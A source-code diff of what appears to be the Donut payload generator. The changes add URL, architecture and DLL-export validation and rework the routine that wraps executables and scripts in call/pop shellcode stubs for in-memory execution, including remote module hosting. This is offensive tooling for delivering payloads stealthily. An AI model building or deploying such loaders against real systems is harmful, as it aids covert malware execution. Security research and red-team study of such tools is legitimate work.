     if(c->inst_type != DONUT_INSTANCE_PIC &&
        c->inst_type != DONUT_INSTANCE_URL) {
          
@@ -884,17 +862,38 @@ EXPORT_FUNC int DonutCreate(PDONUT_CONFIG c) {
     
     if(c->inst_type == DONUT_INSTANCE_URL) {
       DPRINT("Validating URL");
-      if(c->url[0] == 0) return DONUT_ERROR_INVALID_PARAMETER;
       
+      // no URL? exit
+      if(c->url[0] == 0) {
+        return DONUT_ERROR_INVALID_PARAMETER;
+      }
+      // doesn't begin with one of the following? exit
       if((strnicmp(c->url, "http://",  7) != 0) &&
          (strnicmp(c->url, "https://", 8) != 0)) {
            
         return DONUT_ERROR_INVALID_URL;
       }
-      if(strlen(c->url) < 8) return DONUT_ERROR_INVALID_URL;
+      // invalid length?
+      if(strlen(c->url) <= 8) {
+        return DONUT_ERROR_URL_LENGTH;
+      }
+      // ensure URL parameter and module name don't exceed DONUT_MAX_URL
+      url_len = strlen(c->url);
+      
+      // if the end of string doesn't have a forward slash
+      // add one more to account for it
+      if(c->url[url_len - 1] != '/') {
+        strcat(c->url, "/");
+        url_len++;
+      }
+      
+      if((url_len + DONUT_MAX_MODNAME) >= DONUT_MAX_URL) {
+        return DONUT_ERROR_URL_LENGTH;
+      }
     }
     
-    DPRINT("Checking architecture");
+    DPRINT("Validating architecture");
+    
     if(c->arch != DONUT_ARCH_X86 &&
        c->arch != DONUT_ARCH_X64 &&
        c->arch != DONUT_ARCH_X84)
@@ -902,114 +901,172 @@ EXPORT_FUNC int DonutCreate(PDONUT_CONFIG c) {
       return DONUT_ERROR_INVALID_ARCH;
     }
     
-    // 1. create the module
-    DPRINT("Creating module");
-    err = CreateModule(c);
+    // get file information
+    err = get_file_info(c->file, &fi);
+    if(err != DONUT_ERROR_SUCCESS) return err;
     
-    if(err == DONUT_ERROR_SUCCESS) {
-      // 2. create the instance
-      DPRINT("Creating instance");
-      err = CreateInstance(c);
-      
-      if(err == DONUT_ERROR_SUCCESS) {
-        // if DEBUG is defined, save instance to disk
-        #ifdef DEBUG
-          DPRINT("Saving instance to file");
-          fd = fopen("instance", "wb");
-          
-          if(fd != NULL) {
-            fwrite(c->inst, 1, c->inst_len, fd);
-            fclose(fd);
-          }
-        #endif
-        // 3. if this module will be stored on a remote server
-        if(c->inst_type == DONUT_INSTANCE_URL) {
-          DPRINT("Saving %s to disk.", c->modname);
-          // save the module to disk using random name
-          fd = fopen(c->modname, "wb");
-          
-          if(fd != NULL) {
-            fwrite(c->mod, 1, c->mod_len, fd);
-            fclose(fd);
-          }
+    // Set the module type
+    c->mod_type = fi.type;
+    
+    // Unmanaged EXE/DLL?
+    if(c->mod_type == DONUT_MODULE_DLL ||
+       c->mod_type == DONUT_MODULE_EXE)
+    {
+      DPRINT("Validating architecture %i for DLL/EXE %i",
+        c->arch, fi.arch);
+      // Requested shellcode is x86, but file is x64?
+      if(c->arch == DONUT_ARCH_X86 && 
+         fi.arch == DONUT_ARCH_X64) 
+      {
+        err = DONUT_ERROR_ARCH_MISMATCH;
+        goto cleanup;
+      }
+      // DLL function specified. Does it exist?
+      if(c->mod_type == DONUT_MODULE_DLL &&
+         c->method[0] != 0)
+      {
+        DPRINT("Validating DLL function \"%s\" for DLL", c->method);
+        if(!is_dll_export(&fi, c->method)) {
+          err = DONUT_ERROR_DLL_FUNCTION;
+          goto cleanup;
         }
-        // 4. calculate size of PIC + instance combined
-        if(c->arch == DONUT_ARCH_X86) {
-          c->pic_len = sizeof(PAYLOAD_EXE_X86) + c->inst_len + 32;
-        } else if(c->arch == DONUT_ARCH_X64) {
-          c->pic_len = sizeof(PAYLOAD_EXE_X64) + c->inst_len + 32;
-        } else if(c->arch == DONUT_ARCH_X84) {
-          c->pic_len = sizeof(PAYLOAD_EXE_X86) + 
-                       sizeof(PAYLOAD_EXE_X64) + c->inst_len + 32;
-        }
-        // 5. allocate memory for shellcode
-        c->pic = malloc(c->pic_len);
-        
-        DPRINT("PIC size : %" PRIi64, c->pic_len);
-        
-        if(c->pic != NULL) {
-          DPRINT("Inserting opcodes");
-          // 6. insert shellcode
-          pl = (uint8_t*)c->pic;
-          // call $ + c->inst_len
-          PUT_BYTE(pl,  0xE8);
-          PUT_WORD(pl,  c->inst_len);
-          PUT_BYTES(pl, c->inst, c->inst_len);
-          // pop ecx
-          PUT_BYTE(pl,  0x59);
-          
-          if(c->arch == DONUT_ARCH_X86) {
-            // pop edx
-            PUT_BYTE(pl, 0x5A);
-            // push ecx
-            PUT_BYTE(pl, 0x51);
-            // push edx
-            PUT_BYTE(pl, 0x52);
-            DPRINT("Copying %" PRIi64 " bytes of x86 shellcode", 
-              (uint64_t)sizeof(PAYLOAD_EXE_X86));
-              
-            PUT_BYTES(pl, PAYLOAD_EXE_X86, sizeof(PAYLOAD_EXE_X86));
-          } else if(c->arch == DONUT_ARCH_X64) {
-            DPRINT("Copying %" PRIi64 " bytes of amd64 shellcode", 
-              (uint64_t)sizeof(PAYLOAD_EXE_X64));
-              
-            PUT_BYTES(pl, PAYLOAD_EXE_X64, sizeof(PAYLOAD_EXE_X64));
-          } else if(c->arch == DONUT_ARCH_X84) {
-            DPRINT("Copying %" PRIi64 " bytes of x86 + amd64 shellcode",
-              (uint64_t)(sizeof(PAYLOAD_EXE_X86) + sizeof(PAYLOAD_EXE_X64)));
-              
-            // xor eax, eax
-            PUT_BYTE(pl, 0x31);
-            PUT_BYTE(pl, 0xC0);
-            // dec eax
-            PUT_BYTE(pl, 0x48);
-            // js dword x86_code
-            PUT_BYTE(pl, 0x0F);
-            PUT_BYTE(pl, 0x88);
-            PUT_WORD(pl,  sizeof(PAYLOAD_EXE_X64));
-            PUT_BYTES(pl, PAYLOAD_EXE_X64, sizeof(PAYLOAD_EXE_X64));
-            // pop edx
-            PUT_BYTE(pl, 0x5A);
-            // push ecx
-            PUT_BYTE(pl, 0x51);
-            // push edx
-            PUT_BYTE(pl, 0x52);
-            PUT_BYTES(pl, PAYLOAD_EXE_X86, sizeof(PAYLOAD_EXE_X86));
-          }
-          err = DONUT_ERROR_SUCCESS;
-        } else err = DONUT_ERROR_NO_MEMORY;
+      }
+    }    
+    // .NET DLL assembly?
+    if(c->mod_type == DONUT_MODULE_NET_DLL) {
+      // DLL requires class and method
+      if(c->cls[0] == 0 || c->method[0] == 0) {
+        err = DONUT_ERROR_FILE_PARAMS;
+        goto cleanup;
       }
     }
+    
+    // 1. Create the module
+    DPRINT("Creating module");
+    err = CreateModule(c, &fi);
+    
+    if(err != DONUT_ERROR_SUCCESS) 
+      goto cleanup;
+
+    // 2. Create the instance
+    DPRINT("Creating instance");
+    err = CreateInstance(c, &fi);
+    
+    if(err != DONUT_ERROR_SUCCESS)
+      goto cleanup;
+    
+    // if DEBUG is defined, save instance to disk
+    #ifdef DEBUG
+      DPRINT("Saving instance to file");
+      fd = fopen("instance", "wb");
+      
+      if(fd != NULL) {
+        fwrite(c->inst, 1, c->inst_len, fd);
+        fclose(fd);
+      }
+    #endif
+    // 3. If the module will be stored on a remote server
+    if(c->inst_type == DONUT_INSTANCE_URL) {
+      DPRINT("Saving %s to disk.", c->modname);
+      // save the module to disk using random name
+      fd = fopen(c->modname, "wb");
+      
+      if(fd != NULL) {
+        fwrite(c->mod, 1, c->mod_len, fd);
+        fclose(fd);
+      }
+    }
+    // 4. calculate size of PIC + instance combined
+    if(c->arch == DONUT_ARCH_X86) {
+      c->pic_len = sizeof(PAYLOAD_EXE_X86) + c->inst_len + 32;
+    } else 
+    if(c->arch == DONUT_ARCH_X64) {
+      c->pic_len = sizeof(PAYLOAD_EXE_X64) + c->inst_len + 32;
+    } else 
+    if(c->arch == DONUT_ARCH_X84) {
+      c->pic_len = sizeof(PAYLOAD_EXE_X86) + 
+                   sizeof(PAYLOAD_EXE_X64) + c->inst_len + 32;
+    }
+    // 5. allocate memory for shellcode
+    c->pic = malloc(c->pic_len);
+    
+    DPRINT("PIC size : %" PRIi64, c->pic_len);
+    
+    if(c->pic == NULL) {
+      err = DONUT_ERROR_NO_MEMORY;
+      goto cleanup;
+    }
+    
+    DPRINT("Inserting opcodes");
+    // 6. insert shellcode
+    pl = (uint8_t*)c->pic;
+    // call $ + c->inst_len
+    PUT_BYTE(pl,  0xE8);
+    PUT_WORD(pl,  c->inst_len);
+    PUT_BYTES(pl, c->inst, c->inst_len);
+    // pop ecx
+    PUT_BYTE(pl,  0x59);
+    
+    // x86?
+    if(c->arch == DONUT_ARCH_X86) {
+      // pop edx
+      PUT_BYTE(pl, 0x5A);
+      // push ecx
+      PUT_BYTE(pl, 0x51);
+      // push edx
+      PUT_BYTE(pl, 0x52);
+      
+      DPRINT("Copying %" PRIi64 " bytes of x86 shellcode", 
+        (uint64_t)sizeof(PAYLOAD_EXE_X86));
+        
+      PUT_BYTES(pl, PAYLOAD_EXE_X86, sizeof(PAYLOAD_EXE_X86));
+    } else 
+    // AMD64?
+    if(c->arch == DONUT_ARCH_X64) {
+      
+      DPRINT("Copying %" PRIi64 " bytes of amd64 shellcode", 
+        (uint64_t)sizeof(PAYLOAD_EXE_X64));
+        
+      PUT_BYTES(pl, PAYLOAD_EXE_X64, sizeof(PAYLOAD_EXE_X64));
+    } else 
+    // x86 + AMD64?
+    if(c->arch == DONUT_ARCH_X84) {
+      
+      DPRINT("Copying %" PRIi64 " bytes of x86 + amd64 shellcode",
+        (uint64_t)(sizeof(PAYLOAD_EXE_X86) + sizeof(PAYLOAD_EXE_X64)));
+        
+      // xor eax, eax
+      PUT_BYTE(pl, 0x31);
+      PUT_BYTE(pl, 0xC0);
+      // dec eax
+      PUT_BYTE(pl, 0x48);
+      // js dword x86_code
+      PUT_BYTE(pl, 0x0F);
+      PUT_BYTE(pl, 0x88);
+      PUT_WORD(pl,  sizeof(PAYLOAD_EXE_X64));
+      PUT_BYTES(pl, PAYLOAD_EXE_X64, sizeof(PAYLOAD_EXE_X64));
+      // pop edx
+      PUT_BYTE(pl, 0x5A);
+      // push ecx
+      PUT_BYTE(pl, 0x51);
+      // push edx
+      PUT_BYTE(pl, 0x52);
+      PUT_BYTES(pl, PAYLOAD_EXE_X86, sizeof(PAYLOAD_EXE_X86));
+    }
+cleanup:
     // if there was some error, release resources
     if(err != DONUT_ERROR_SUCCESS) {
       DonutDelete(c);
     }
+    DPRINT("Leaving.");
     return err;
 }
 
 // release resources allocated for configuration
-EXPORT_FUNC int DonutDelete(PDONUT_CONFIG c) {
+EXPORT_FUNC 
+int DonutDelete(PDONUT_CONFIG c) {
     
+    DPRINT("Entering.");
     if(c == NULL) {
       return DONUT_ERROR_INVALID_PARAMETER;
     }
@@ -1028,6 +1085,7 @@ EXPORT_FUNC int DonutDelete(PDONUT_CONFIG c) {
       free(c->pic);
       c->pic = NULL;
     }
+    DPRINT("Leaving.");
     return DONUT_ERROR_SUCCESS;
 }
 
@@ -1054,7 +1112,7 @@ const char *err2str(int err) {
         str = "File is invalid";
         break;      
       case DONUT_ERROR_FILE_PARAMS:
-        str = "File is a .NET DLL. Requires a class and method";
+        str = "File is a .NET DLL. Donut requires a class and method";
         break;
       case DONUT_ERROR_NO_MEMORY:
         str = "No memory available";
@@ -1073,6 +1131,12 @@ const char *err2str(int err) {
         break;
       case DONUT_ERROR_RANDOM:
         str = "Error generating random values";
+        break;
+      case DONUT_ERROR_DLL_FUNCTION:
+        str = "Unable to locate DLL function provided. Names are case sensitive";
+        break;
+      case DONUT_ERROR_ARCH_MISMATCH:
+        str = "Target architecture cannot support selected DLL/EXE file";
         break;
     }
     return str;
@@ -1095,7 +1159,7 @@ static void usage (void) {
     printf(" usage: donut [options] -f <EXE/DLL/VBS/JS/XSL>\n\n");
     
     printf("                   -MODULE OPTIONS-\n\n");
-    printf("       -f <path>            .NET EXE/DLL, VBS, JS or XSL file to embed in shellcode.\n");
+    printf("       -f <path>            .NET assembly, EXE, DLL, VBS, JS or XSL file to execute in-memory.\n");
     printf("       -u <URL>             HTTP server that will host the donut module.\n\n");
 
     printf("                   -PIC/SHELLCODE OPTIONS-\n\n");    
@@ -1104,7 +1168,7 @@ static void usage (void) {
     
     printf("                   -DOTNET OPTIONS-\n\n");
     printf("       -c <namespace.class> Optional class name.  (required for .NET DLL)\n");
-    printf("       -m <method | api>    Optional method or API name. (method is required for .NET DLL)\n");
+    printf("       -m <method | api>    Optional method or API name for DLL. (method is required for .NET DLL)\n");
     printf("       -p <arg1,arg2...>    Optional parameters or command line, separated by comma or semi-colon.\n");
     printf("       -r <version>         CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.\n");
     printf("       -d <name>            AppDomain name to create for .NET. Randomly generated by default.\n\n");
@@ -1158,7 +1222,7 @@ int main(int argc, char *argv[]) {
         case 'f':
           strncpy(c.file, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
           break;
-        // runtime version to use
+        // runtime version to use for .NET DLL / EXE
         case 'r':
           strncpy(c.runtime, get_param(argc, argv, &i), DONUT_MAX_NAME - 1);
           break;
@@ -1180,7 +1244,7 @@ int main(int argc, char *argv[]) {
         case 'o':
           payload = get_param(argc, argv, &i);
           break;
-        // parameters to method for .NET assembly
+        // parameters to method or DLL function
         case 'p':
           strncpy(c.param, get_param(argc, argv, &i), sizeof(c.param) - 1);
           break;
@@ -1190,7 +1254,7 @@ int main(int argc, char *argv[]) {
       }
     }
     
-    // no file?
+    // no file? show usage and exit
     if(c.file[0] == 0) {
       usage();
     }
@@ -1237,6 +1301,10 @@ int main(int argc, char *argv[]) {
     if(c.mod_type == DONUT_MODULE_NET_DLL) {
       printf("  [ Class         : %s\n", c.cls   );
       printf("  [ Method        : %s\n", c.method);
+    } else
+    if(c.mod_type == DONUT_MODULE_DLL) {
+      printf("  [ Function      : %s\n", 
+        c.method[0] != 0 ? c.method : "DllMain");
     }
     // if parameters supplied, display them
     if(c.param[0] != 0) {
